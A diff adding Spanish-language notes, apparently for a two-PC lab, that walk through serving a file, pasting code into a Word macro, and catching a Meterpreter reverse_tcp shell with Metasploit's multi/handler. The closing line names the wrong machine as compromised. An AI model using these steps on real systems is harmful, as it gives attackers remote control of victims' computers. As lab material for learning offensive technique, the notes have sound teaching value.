@@ -6,4 +6,16 @@
 ++ PC1: python3 -m http.server 8080 (Inicia un servidor para subir el archivo generado)
 ++ PC2: Ir a un navegador web y escribir la ip del PC1
 ++ PC2: Descargar el archivo 
-++ PC2: 
+++ PC2: Abrir el word ---> Vista ---> Macro ---> Nombrar y crear la nueva Macro 
+++ PC2: Copiar y pegar el código en el editor
+++ PC2: Guardar los cambios y el documento
+++ PC1: msfconsole
+++ PC1: use exploit/multi/handler
+++ PC1: set payload windows/meterpreter/reverse_tcp 
+++ PC1: set LHOST <ip_PC1> 
+++ PC1: SET LPORT <443>
+++ PC1: exploit
+++ PC2: Abrir el documento
+++ PC1: En estos momentos tenemos control sobre PC1, lo que nos da la posibilidad de ejecutar los siguientes comandos:
+--- 
+
